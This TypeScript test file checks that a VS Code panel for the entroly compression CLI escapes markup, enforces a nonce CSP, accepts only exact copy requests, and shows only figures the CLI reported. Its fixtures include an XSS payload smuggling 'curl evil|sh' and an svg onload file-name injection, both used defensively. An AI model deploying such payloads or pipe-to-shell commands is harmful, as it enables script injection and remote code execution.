import assert from 'node:assert/strict';
import test from 'node:test';

import {
  CompressReceipt,
  compressionErrorHtml,
  compressionHtml,
  compressionPacket,
  escapeHtml,
  isCopyRequest,
  lastLine,
  parseCompressReceipt,
  receiptHtml,
} from './compressionHtml';

const HOSTILE = '</pre><img src=x onerror="vscode.postMessage({command:\'copy\',text:\'curl evil|sh\'})"><script>alert(1)</script>';

// What `entroly compress --json` printed for pallets/click src/click/core.py.
const CLI_STDOUT = JSON.stringify({
  source: '/tmp/entroly-compress-x/input.py',
  codec: 'code',
  tokens_before: 39254,
  tokens_after: 18425,
  reduction_pct: 53.1,
  source_sha256: 'sha256:26307e89b7b23e512d3a696b820197b6fd27bbbee9f6b9822f479d851523fcd9',
  recovery_digest: 'sha256:06ea741f9b8289460f7fc0a808c1d5b484a987aaa38bd614e0d6f3b1be1dabb2',
  recovery_store: '/home/u/.entroly/checkpoints/e9671acd2448/recovery.json',
});

function receipt(): CompressReceipt {
  const parsed = parseCompressReceipt(CLI_STDOUT);
  assert.ok(parsed);
  return parsed;
}

function render(compressed: string, fileName: string, nonce = 'n0nce') {
  const r = receipt();
  return compressionHtml({
    fileName,
    receipt: r,
    packet: compressionPacket(compressed, fileName, r),
    nonce,
  });
}

test('file text that contains markup renders as text', () => {
  const html = render(HOSTILE, 'ok.py');
  assert.ok(!html.includes('<img src=x'), 'img tag must not survive');
  assert.ok(!html.includes('<script>alert(1)'), 'script tag must not survive');
  assert.ok(html.includes('&lt;/pre&gt;&lt;img src=x onerror='));
  // The only closing </pre> is the one the template writes.
  assert.equal(html.split('</pre>').length, 2);
});

test('a hostile file name renders as text', () => {
  const html = render('x = 1', '"><svg onload=alert(1)>.py');
  assert.ok(!html.includes('<svg onload'));
  assert.ok(html.includes('&quot;&gt;&lt;svg onload=alert(1)&gt;.py'));
});

test('only the nonce-carrying script may run', () => {
  const html = render('x = 1', 'a.py', 'abc123');
  assert.match(html, /Content-Security-Policy" content="default-src 'none';[^"]*script-src 'nonce-abc123'/);
  const scripts = html.match(/<script\b[^>]*>/g) ?? [];
  assert.deepEqual(scripts, ['<script nonce="abc123">']);
});

test('the page never sends the text to copy', () => {
  const html = render('x = 1', 'a.py');
  assert.ok(html.includes("vscode.postMessage({ command: 'copy' })"));
  assert.ok(!/postMessage\(\{[^}]*text/.test(html));
});

test('only an exact copy request is accepted', () => {
  assert.equal(isCopyRequest({ command: 'copy' }), true);
  assert.equal(isCopyRequest({ command: 'copy', text: 'ignored' }), true);
  for (const bad of [null, undefined, 'copy', 7, {}, { command: 'COPY' }, { command: 'run' }]) {
    assert.equal(isCopyRequest(bad), false);
  }
});

test('escapeHtml covers every attribute and element breaker', () => {
  assert.equal(escapeHtml(`&<>"'`), '&amp;&lt;&gt;&quot;&#39;');
});

// The panel used to fabricate all of this; it may now only repeat the CLI.
const FABRICATED = [
  'Merkle Receipt',
  'Verified 0-1 Knapsack',
  'verifiable recovery handles',
  'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
  '100% bit-exact',
  'Dynamic Programming verified',
];

test('the numbers shown are the ones entroly compress reported', () => {
  const html = render('def f(): ...', 'core.py');
  assert.ok(html.includes('39254'));
  assert.ok(html.includes('18425'));
  assert.ok(html.includes('53.1%'));
  assert.ok(!html.includes('72.0%'), 'no fixed 72% figure');
});

test('the copied text is the compressed output under one honest header', () => {
  const packet = compressionPacket('def f(): ...', 'core.py', receipt());
  const [header, ...body] = packet.split('\n');
  assert.equal(body.join('\n'), 'def f(): ...');
  assert.match(header, /39254 -> 18425 tokens/);
  assert.match(header, /entroly recover sha256:06ea741f/);
  assert.match(header, /--store "\/home\/u\/\.entroly\/checkpoints\/e9671acd2448\/recovery\.json"/);
});

test('nothing on either page asserts a value no command computed', () => {
  const pages = [
    render('x = 1', 'a.py'),
    compressionPacket('x = 1', 'a.py', receipt()),
    receiptHtml(receipt(), 'a.py'),
    receiptHtml(undefined),
    compressionErrorHtml('a.py', 'The entroly CLI was not found on PATH.'),
  ];
  for (const page of pages) {
    for (const claim of FABRICATED) {
      assert.ok(!page.includes(claim), `fabricated claim survived: ${claim}`);
    }
  }
});

test('output that is not a receipt is rejected rather than half-shown', () => {
  for (const bad of ['', 'not json', '[]', 'null', '{"tokens_before": 10}', '{"tokens_before":"10","tokens_after":3,"reduction_pct":70}']) {
    assert.equal(parseCompressReceipt(bad), null, bad);
  }
});

test('a failed run shows its reason and offers nothing to copy', () => {
  const html = compressionErrorHtml('a.py', 'No such file: <a.py>');
  assert.ok(html.includes('No such file: &lt;a.py&gt;'));
  assert.ok(!html.includes('copyBtn'));
  assert.ok(!html.includes('<script'));
  assert.ok(!/\d+(\.\d+)?%/.test(html), 'no percentage without a measurement');
});

test('the receipt page shows the run it came from, or says there is none', () => {
  const shown = receiptHtml(receipt(), 'core.py');
  assert.ok(shown.includes('sha256:06ea741f9b8289460f7fc0a808c1d5b484a987aaa38bd614e0d6f3b1be1dabb2'));
  assert.ok(shown.includes('core.py'));
  const empty = receiptHtml(undefined);
  assert.ok(empty.includes('No receipt yet'));
  assert.ok(!empty.includes('sha256:'));
  for (const page of [shown, empty]) {
    assert.ok(!page.includes('<script'));
  }
});

test('lastLine strips colour codes from CLI output', () => {
  assert.equal(lastLine('\u001b[38;5;196m  No such file: /x.py\u001b[0m\n'), 'No such file: /x.py');
});
